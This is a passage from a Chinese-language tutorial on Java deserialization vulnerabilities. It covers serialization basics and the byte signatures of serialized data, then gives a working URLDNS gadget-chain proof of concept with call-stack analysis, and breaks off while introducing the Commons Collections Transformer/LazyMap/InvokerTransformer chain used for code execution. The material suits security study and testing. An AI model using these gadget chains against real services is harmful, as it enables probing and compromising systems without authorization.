class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>serialVersionUID</strong>：每个可序列化类建议定义一个 <code>serialVersionUID</code> 字段，用于版本控制。不同的 <code>serialVersionUID</code> 表示类的不同版本，如果序列化和反序列化的版本不匹配会抛出 <code>InvalidClassException</code>。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure></div></li>
<li><strong>transient 关键字</strong>：声明为 <code>transient</code> 的字段不会被序列化。它用于避免序列化敏感信息或不需要保存的字段。这种字段反序列化后为默认值（如 <code>null</code>）。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// 密码不会被序列化</span></span><br></pre></td></tr></table></figure></div></li>
<li><strong>静态字段</strong>：静态字段属于类，而不是实例，因此不会被序列化。</li>
<li><strong>对象图的完整性</strong>：序列化对象时，会递归地序列化其引用的所有对象。因此，引用对象也必须是可序列化的，否则会抛出 <code>NotSerializableException</code>。</li>
</ul>
<h2 id="序列化接口"><a href="#序列化接口" class="headerlink" title="序列化接口"></a>序列化接口</h2><h3 id="序列化基本用法"><a href="#序列化基本用法" class="headerlink" title="序列化基本用法"></a>序列化基本用法</h3><ul>
<li><strong>序列化对象</strong>：使用 <code>ObjectOutputStream</code> 将对象写入（<code>writeObject</code> 方法）到输出流（如文件输出流）。  <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br></pre></td></tr></table></figure></div></li>
<li><strong>反序列化对象</strong>：使用 <code>ObjectInputStream</code> 从输入流（如文件输入流）读取（<code>readObject</code> 方法）对象。  <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">hashMap = (HashMap)objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h3><ul>
<li><p><strong>自定义序列化</strong>：通过实现 <code>writeObject</code> 和 <code>readObject</code> 方法，可以自定义序列化和反序列化的行为。<strong>通常精心构造的序列化对象和 readObject 的自定义操作结合就可以造成反序列化漏洞。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.defaultWriteObject(); <span class="comment">// 默认序列化</span></span><br><span class="line">    <span class="comment">// 额外的序列化逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">    <span class="comment">// 额外的反序列化逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>Externalizable 接口</strong>：<code>Externalizable</code> 是 <code>Serializable</code> 的子接口，它强制实现 <code>writeExternal</code> 和 <code>readExternal</code> 方法，提供完全控制序列化过程的能力。这对性能优化或定制序列化格式非常有用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参数构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="反序列化功能特征"><a href="#反序列化功能特征" class="headerlink" title="反序列化功能特征"></a>反序列化功能特征</h2><h3 id="压缩特征（压缩后一些数据格式改变）"><a href="#压缩特征（压缩后一些数据格式改变）" class="headerlink" title="压缩特征（压缩后一些数据格式改变）"></a>压缩特征（压缩后一些数据格式改变）</h3><ul>
<li>zip 格式特征：<code>PK*</code></li>
<li>zip+base64：<code>UE*</code></li>
<li>gzip+base64：<code>H4s*</code></li>
</ul>
<h3 id="反序列化数据特征-数据内容-请求类型"><a href="#反序列化数据特征-数据内容-请求类型" class="headerlink" title="反序列化数据特征(数据内容+请求类型)"></a>反序列化数据特征(数据内容+请求类型)</h3><ul>
<li><code>AC ED 00 05</code> in Hex</li>
<li><code>rO0</code> in Base64</li>
<li><code>Content-type = ‘application/x-java-serialized-object</code></li>
</ul>
<h2 id="反序列化利用（URLDNS-为例）"><a href="#反序列化利用（URLDNS-为例）" class="headerlink" title="反序列化利用（URLDNS 为例）"></a>反序列化利用（URLDNS 为例）</h2><p>URLDNS 反序列化利用链可以通过 DNS 请求来验证反序列化漏洞的可利用性。这条利用链使用 Java 内置的类构造，对第三方库没有依赖，可以在没有回显的情况下验证是否存在反序列化漏洞。我们可以在 <a class="link"   href="https://requestrepo.com/" >https://requestrepo.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站上进行 DNS 请求测试。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://www.example.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">getHostAddress:436, URLStreamHandler (java.net)</span><br><span class="line">hashCode:353, URLStreamHandler (java.net)</span><br><span class="line">hashCode:878, URL (java.net)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br></pre></td></tr></table></figure></div>
<p>首先在 <code>HashMap.readObject</code> 中会遍历 <code>HashMap</code> 的成员并对 <code>key</code> 调用 <code>HashMap.hash</code> 函数计算 hash。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">    	...</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);	<span class="comment">//	&lt;-- 调用 hash 函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>HashMap.hash</code> 函数中会调用 <code>key</code> 的 <code>hashCode</code> 方法，也就是 <code>URL.hashCode</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>URL.hashCode</code> 函数中，由于我们设置 <code>url</code> 对象的 <code>hashCode</code> 成员值为 -1，因此会调用 <code>URLStreamHandler.hashCode</code> 函数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>URLStreamHandler.hashCode</code> 函数会调用 <code>getHostAddress</code> 函数获取 URL 对应的  ip 地址，也就会发送 DNS 请求。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="CommonCollections-系列"><a href="#CommonCollections-系列" class="headerlink" title="CommonCollections 系列"></a>CommonCollections 系列</h1><h2 id="Commons-Collections-概述"><a href="#Commons-Collections-概述" class="headerlink" title="Commons Collections 概述"></a>Commons Collections 概述</h2><p>Apache Commons Collections 是⼀个著名的辅助开发库，包含了一些 Java 中没有的数据结构和和辅助方法，不过随着 Java 9 以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
<p>在 2015 年底 commons-collections 反序列化利用链被提出时，Apache Commons Collections 有以下两个分支版本：</p>
<ul>
<li><code>commons-collections:commons-collections</code></li>
<li><code>org.apache.commons:commons-collections4</code></li>
</ul>
<p>前者是 Commons Collections 老的版本包，当时版本号是 3.2.1；后者是官方在 2013 年推出的 4 版本，当时版本号是 4.0。</p>
<p>因为官方认为旧的 commons-collections 有⼀些架构和 API 设计上的问题，但修复这些问题，会产生大量不能向前兼容的改动。所以，commons-collections4 不再认为是一个用来替换 commons-collections 的新版本，而是一个新的包，两者的命名空间不冲突，因此可以共存在同一个项目中。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons/collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons/collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><code>Transformer</code> 是一个接口，具体代码如下，可以看到这个接口只有一个 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>Transformer</code> 可以说是 CC 链的核心，<del>几乎</del>所有的 CC 链都依赖于 <code>Transformer</code>。我们可以简单的把 CC 链总结为：</p>
<ul>
<li>先寻找一个类，这个类自定义的 <code>readObject</code> 方法会直接或间接的触发<strong>对指定 <code>Transformer</code> 对象调用 <code>transform</code> 方法</strong>的代码。</li>
<li>由于我们可以用一系列 <code>Transformer</code> 接口实现类实现代码执行流的完全控制，因此当调用 <code>transform</code> 方法的时候，就可以执行我们的恶意代码。</li>
</ul>
<h3 id="调用-transform-方法的对象"><a href="#调用-transform-方法的对象" class="headerlink" title="调用 transform 方法的对象"></a>调用 transform 方法的对象</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>TransformedMap</code> 用于对 Java 标准数据结构 Map 做一个修饰，被修饰过的 <code>Map</code> 在添加（写入操作）新的元素时，将可以执行一个回调。我们通过下面这行代码对 <code>innerMap</code> 进行修饰，传出的 <code>outerMap</code> 即是修饰后的 <code>Map</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure></div>
<p>被修饰后的 <code>outerMap</code> 在转换 <code>Map</code> 的新元素时，就会调用 <code>transform</code> 方法，这个过程就类似在调用⼀个“回调函数”，这个回调的参数是原始对象。</p>
<p>例如 <code>TransformedMap.put</code> 方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外对 <code>TransformedMap</code> 内部成员调用 <code>setValue</code> 时也会调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code> 和 <code>TransformedMap</code> 类似，都来自于 Common-Collections 库，并继承 <code>AbstractMapDecorator</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></div>
<p>在 Common-Collections4 中 <code>decorate</code> 方法改为 <code>lazyMap</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div>
<p><code>LazyMap</code> 的漏洞触发点和 <code>TransformedMap</code> 唯一的差别是，<code>TransformedMap</code> 是在写入元素的时候执行 <code>transform</code>，而 <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意  <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code> 的条件是 <code>LazyMap</code> 没有当前查询的 <code>key</code>，也就是说对于一个特定的 <code>key</code>，我们只能调用一次 <code>transform</code> 。除非调用 <code>Map.clear</code> 方法清空 <code>LazyMap</code> 。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code> 实现了 <code>java.util.Comparator</code> 接口，这个接口用于定义两个对象如何进行比较。对于一些需要维护顺序的数据结构（如 <code>java.util.PriorityQueue</code>），如果传入 <code>TransformingComparator</code> 用于两个对象的比较，那么比较两个对象的时候会调用 <code>TransformingComparator</code> 的 <code>compare</code> 方法。在 <code>compare</code> 方法内部会调用其中 <code>transformer</code> 成员的 <code>transform</code> 方法并传入进行比较的对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>TransformingComparator</code> 的构造函数如下，这里的 <code>transformer</code> 就是我们构造的 <code>Transformer</code> 结构，另外 <code>decorated</code> 如果不指定会传入 <code>new ComparableComparator()</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Transformer-的接口实现类"><a href="#Transformer-的接口实现类" class="headerlink" title="Transformer 的接口实现类"></a>Transformer 的接口实现类</h3><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code> 在构造函数的时候传入一个对象，并在 <code>transform</code> 方法将这个对象再返回：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>Transformer</code> 构造的代码执行流中，我们可以把 <code>ConstantTransformer</code> 理解为一个常量，可以返回一个确定的对象。</p>
<p>这样我们就可以屏蔽前面定义的 <code>readObject</code> 方法触发 <code>transform</code> 方法调用时传入的 <code>input</code> 参数对我们构造的 <code>Transformer</code> 构造的代码执行流产生影响。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code> 可以对 <code>transform</code> 方法传入的对象参数用来执行任意方法，这也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个 <code>InvokerTransformer</code> 时，需要传入三个参数：</p>
<ul>
<li><code>String methodName</code>：待执行的函数名</li>
<li><code>Class[] paramTypes</code>：这个函数的参数类型列表</li>
<li><code>Object[] args</code>：传给这个函数的参数列表<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
